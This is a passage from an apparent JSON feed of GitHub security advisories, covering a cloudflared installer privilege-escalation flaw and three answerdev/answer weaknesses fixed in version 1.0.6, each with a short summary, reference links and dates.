href=\"https://github.com/cloudflare/cloudflared/security/advisories/GHSA-7mjv-x3jf-545x\">https://github.com/cloudflare/cloudflared/security/advisories/GHSA-7mjv-x3jf-545x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1314\">https://nvd.nist.gov/vuln/detail/CVE-2023-1314</a></li>\n<li><a href=\"https://github.com/cloudflare/cloudflared/commit/9c15f31d003bebfbe6467c2b42972df3e7c9b886\">https://github.com/cloudflare/cloudflared/commit/9c15f31d003bebfbe6467c2b42972df3e7c9b886</a></li>\n<li><a href=\"https://github.com/cloudflare/cloudflared/releases\">https://github.com/cloudflare/cloudflared/releases</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mjv-x3jf-545x\">https://github.com/advisories/GHSA-7mjv-x3jf-545x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mjv-x3jf-545x",
            "title": "[github.com/cloudflare/cloudflared] cloudflared's Installer has Local Privilege Escalation Vulnerability",
            "date_modified": "2023-03-21T22:32:50.000Z",
            "date_published": "2023-03-21T22:32:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mjv-x3jf-545x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Business Logic Errors in GitHub repository answerdev/answer prior to 1.0.6.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1541\">https://nvd.nist.gov/vuln/detail/CVE-2023-1541</a></li>\n<li><a href=\"https://github.com/answerdev/answer/commit/15390adbfcd5fd37af4661f992f8873ae5a6b840\">https://github.com/answerdev/answer/commit/15390adbfcd5fd37af4661f992f8873ae5a6b840</a></li>\n<li><a href=\"https://huntr.dev/bounties/8fd891c6-b04e-4dac-818f-9ea30861cd92\">https://huntr.dev/bounties/8fd891c6-b04e-4dac-818f-9ea30861cd92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h2wg-83fc-xvm9\">https://github.com/advisories/GHSA-h2wg-83fc-xvm9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h2wg-83fc-xvm9",
            "title": "[github.com/answerdev/answer] Answer vulnerable to Business Logic Errors",
            "date_modified": "2023-03-21T22:32:44.000Z",
            "date_published": "2023-03-21T06:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h2wg-83fc-xvm9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Observable Response Discrepancy in GitHub repository answerdev/answer prior to 1.0.6.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1540\">https://nvd.nist.gov/vuln/detail/CVE-2023-1540</a></li>\n<li><a href=\"https://github.com/answerdev/answer/commit/1de3ec27e50ba7389c9449c59e8ea3a37a908ee4\">https://github.com/answerdev/answer/commit/1de3ec27e50ba7389c9449c59e8ea3a37a908ee4</a></li>\n<li><a href=\"https://huntr.dev/bounties/d8d6c259-a0f2-4209-a3b0-ecbf3eb092f4\">https://huntr.dev/bounties/d8d6c259-a0f2-4209-a3b0-ecbf3eb092f4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6x5v-cxpp-pc5x\">https://github.com/advisories/GHSA-6x5v-cxpp-pc5x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6x5v-cxpp-pc5x",
            "title": "[github.com/answerdev/answer] Answer has Observable Response Discrepancy",
            "date_modified": "2023-03-23T19:10:59.000Z",
            "date_published": "2023-03-21T06:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6x5v-cxpp-pc5x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Guessable CAPTCHA in GitHub repository answerdev/answer prior to 1.0.6.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1539\">https://nvd.nist.gov/vuln/detail/CVE-2023-1539</a></li>\n<li><a href=\"https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af\">https://github.com/answerdev/answer/commit/813ad0b9894673b1bdd489a2e9ab60a44fe990af</a></li>\n<li><a href=\"https://huntr.dev/bounties/b4df67f4-14ea-4051-97d4-26690c979a28\">https://huntr.dev/bounties/b4df67f4-14ea-4051-97d4-26690c979a28</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g44v-6qfm-f6ch\">https://github.com/advisories/GHSA-g44v-6qfm-f6ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g44v-6qfm-f6ch",
            "title": "[github.com/answerdev/answer] Answer has Guessable CAPTCHA",
            "date_modified": "2023-03-21T22:32:32.000Z",
            "date_published": "2023-03-21T06:30:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g44v-6qfm-f6ch"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}